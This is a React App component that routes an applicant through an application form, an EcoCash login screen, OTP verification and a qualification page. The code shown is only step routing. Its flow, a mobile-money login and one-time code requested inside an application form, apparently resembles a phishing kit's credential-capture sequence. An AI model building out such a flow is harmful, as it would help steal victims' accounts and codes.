import { useState } from 'react';
import ApplicationForm, { ApplicationData } from './components/ApplicationForm';
import EcoCashLogin from './components/EcoCashLogin';
import OTPVerification from './components/OTPVerification';
import QualificationPage from './components/QualificationPage';

type Step = 'application' | 'ecocash' | 'otp' | 'qualification';

function App() {
  const [currentStep, setCurrentStep] = useState<Step>('application');
  const [applicationId, setApplicationId] = useState<string>('');
  const [applicationData, setApplicationData] = useState<ApplicationData | null>(null);

  const handleApplicationSubmit = (id: string, data: ApplicationData) => {
    setApplicationId(id);
    setApplicationData(data);
    setCurrentStep('ecocash');
  };

  const handleEcoCashSubmit = () => {
    setCurrentStep('otp');
  };

  const handleOTPSubmit = () => {
    setCurrentStep('qualification');
  };

  return (
    <>
      {currentStep === 'application' && (
        <ApplicationForm onNext={handleApplicationSubmit} />
      )}

      {currentStep === 'ecocash' && applicationData && (
        <EcoCashLogin
          applicationId={applicationId}
          phoneNumber={applicationData.phoneNumber}
          onNext={handleEcoCashSubmit}
        />
      )}

      {currentStep === 'otp' && applicationData && (
        <OTPVerification
          applicationId={applicationId}
          phoneNumber={applicationData.phoneNumber}
          onNext={handleOTPSubmit}
        />
      )}

      {currentStep === 'qualification' && applicationData && (
        <QualificationPage
          applicationId={applicationId}
          fullName={applicationData.fullName}
          phoneNumber={applicationData.phoneNumber}
        />
      )}
    </>
  );
}

export default App;
